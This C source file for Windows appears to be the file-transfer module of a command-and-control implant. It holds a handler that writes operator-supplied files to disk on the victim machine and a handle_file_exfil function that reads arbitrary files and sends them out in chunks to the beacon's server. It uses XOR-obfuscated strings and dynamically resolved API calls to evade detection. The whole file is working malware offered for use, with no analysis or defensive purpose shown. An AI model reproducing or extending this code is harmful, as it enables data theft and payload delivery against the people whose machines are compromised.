#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include "transfer.h"
#include "protocol.h"
#include "http.h"
#include "obf.h"
#include "obf_strings.h"
#include "../../include/dynapi.h"

#define MAX_STAGE_SLOTS  4
#define EXFIL_CHUNK_SIZE 65536

typedef struct {
    uint32_t label;
    HANDLE   hFile;
    int      active;
    char     dest_path[MAX_PATH];
} stage_slot_t;

static stage_slot_t stage_slots[MAX_STAGE_SLOTS];

static int path_has_traversal(const char *path) {
    for (const char *p = path; *p; p++) {
        if (p[0] == '.' && p[1] == '.' &&
            (p[2] == '\\' || p[2] == '/' || p[2] == '\0'))
            return 1;
    }
    return 0;
}

void handle_file_stage(uint32_t beacon_id, uint32_t label,
                       uint32_t identifier, uint16_t flags,
                       const uint8_t *data, uint32_t len,
                       const uint8_t session_key[32]) {
    stage_slot_t *slot = NULL;

    if (identifier == 0) {
        /* Allocate a new slot */
        for (int i = 0; i < MAX_STAGE_SLOTS; i++) {
            if (!stage_slots[i].active) { slot = &stage_slots[i]; break; }
        }
        if (!slot) {
            /* No free slot — silently drop */
            return;
        }

        if (len < 2) return;
        uint16_t path_len = (uint16_t)data[0] | ((uint16_t)data[1] << 8);
        if ((uint32_t)path_len + 2 > len) return;

        char dest_path[MAX_PATH] = {0};
        uint32_t copy_len = path_len < MAX_PATH - 1 ? path_len : MAX_PATH - 1;
        memcpy(dest_path, data + 2, copy_len);

        if (path_has_traversal(dest_path)) return;

        HANDLE hFile = fnCreateFileA2(dest_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;

        slot->label  = label;
        slot->hFile  = hFile;
        slot->active = 1;
        memcpy(slot->dest_path, dest_path, copy_len);
        slot->dest_path[copy_len] = '\0';

        /* Write chunk bytes that follow the path prefix */
        const uint8_t *chunk = data + 2 + path_len;
        uint32_t chunk_len   = len  - 2 - path_len;
        if (chunk_len > 0) {
            DWORD written = 0;
            if (!fnWriteFile(hFile, chunk, chunk_len, &written, NULL) || written != chunk_len) {
                fnCloseHandle2(hFile);
                slot->active = 0;
                return;
            }
        }
    } else {
        /* Find existing slot by label */
        for (int i = 0; i < MAX_STAGE_SLOTS; i++) {
            if (stage_slots[i].active && stage_slots[i].label == label) {
                slot = &stage_slots[i]; break;
            }
        }
        if (!slot) return;

        if (len > 0) {
            DWORD written = 0;
            if (!fnWriteFile(slot->hFile, data, len, &written, NULL) || written != len) {
                fnCloseHandle2(slot->hFile);
                slot->hFile  = NULL;
                slot->active = 0;
                slot->label  = 0;
                return;
            }
        }
    }

    if (slot && (flags & FLAG_LAST_FRAG)) {
        fnCloseHandle2(slot->hFile);
        char msg[MAX_PATH + 32];
        snprintf(msg, sizeof(msg), "upload complete: %s", slot->dest_path);
        uint32_t msg_len = (uint32_t)strlen(msg);
        uint8_t rep[4 + MAX_PATH + 32];
        rep[0] = (uint8_t)(msg_len & 0xFF);
        rep[1] = (uint8_t)((msg_len >> 8) & 0xFF);
        rep[2] = (uint8_t)((msg_len >> 16) & 0xFF);
        rep[3] = (uint8_t)((msg_len >> 24) & 0xFF);
        memcpy(rep + 4, msg, msg_len);
        send_result_raw(beacon_id, label, TASK_FILE_STAGE, FLAG_NONE, 0,
                        rep, 4 + msg_len, session_key);
        slot->hFile  = NULL;
        slot->active = 0;
        slot->label  = 0;
        slot->dest_path[0] = '\0';
    }
}

void handle_file_exfil(uint32_t beacon_id, uint32_t label,
                       const char *src_path,
                       const uint8_t session_key[32]) {
    HANDLE hFile = fnCreateFileA2(src_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char _err[ENC_EXFIL_ERR_OPEN_LEN + 1];
        xor_dec(_err, ENC_EXFIL_ERR_OPEN, ENC_EXFIL_ERR_OPEN_LEN);
        char msg[128]; snprintf(msg, sizeof(msg), _err, fnGetLastError());
        send_result(beacon_id, label, FLAG_ERROR, msg, session_key);
        return;
    }

    /* Extract basename */
    const char *basename = src_path;
    for (const char *p = src_path; *p; p++) {
        if (*p == '\\' || *p == '/') basename = p + 1;
    }
    uint16_t name_len = (uint16_t)strlen(basename);

    LARGE_INTEGER file_size = {0};
    if (!fnGetFileSizeEx(hFile, &file_size)) {
        fnCloseHandle2(hFile);
        return;
    }
    LONGLONG total   = file_size.QuadPart;
    LONGLONG offset  = 0;
    uint32_t identifier = 0;

    /* Allocate chunk buffer: header bytes + 64KB data */
    uint8_t *chunk_buf = (uint8_t *)fnLocalAlloc(LPTR, 2 + MAX_PATH + EXFIL_CHUNK_SIZE);
    if (!chunk_buf) { fnCloseHandle2(hFile); return; }

    /* Handle empty files: send one last-frag chunk with just the basename prefix */
    if (total == 0) {
        chunk_buf[0] = (uint8_t)(name_len & 0xFF);
        chunk_buf[1] = (uint8_t)((name_len >> 8) & 0xFF);
        memcpy(chunk_buf + 2, basename, name_len);
        send_result_raw(beacon_id, label, TASK_FILE_EXFIL, FLAG_LAST_FRAG, 0,
                        chunk_buf, 2 + name_len, session_key);
        fnLocalFree(chunk_buf);
        fnCloseHandle2(hFile);
        return;
    }

    while (offset < total) {
        uint32_t prefix = 0;
        if (identifier == 0) {
            chunk_buf[0] = (uint8_t)(name_len & 0xFF);
            chunk_buf[1] = (uint8_t)((name_len >> 8) & 0xFF);
            memcpy(chunk_buf + 2, basename, name_len);
            prefix = 2 + name_len;
        }

        DWORD to_read = EXFIL_CHUNK_SIZE;
        LONGLONG remaining = total - offset;
        if ((LONGLONG)to_read > remaining) to_read = (DWORD)remaining;

        DWORD bytes_read = 0;
        if (!fnReadFile(hFile, chunk_buf + prefix, to_read, &bytes_read, NULL)) {
            char _err[ENC_EXFIL_ERR_READ_LEN + 1];
            xor_dec(_err, ENC_EXFIL_ERR_READ, ENC_EXFIL_ERR_READ_LEN);
            char msg[128]; snprintf(msg, sizeof(msg), _err, fnGetLastError());
            send_result(beacon_id, label, FLAG_ERROR, msg, session_key);
            break;
        }

        offset += bytes_read;
        uint16_t flags = (offset >= total) ? FLAG_LAST_FRAG : FLAG_FRAGMENTED;

        send_result_raw(beacon_id, label, TASK_FILE_EXFIL, flags, identifier,
                        chunk_buf, prefix + bytes_read, session_key);
        identifier++;
    }

    fnLocalFree(chunk_buf);
    fnCloseHandle2(hFile);
}
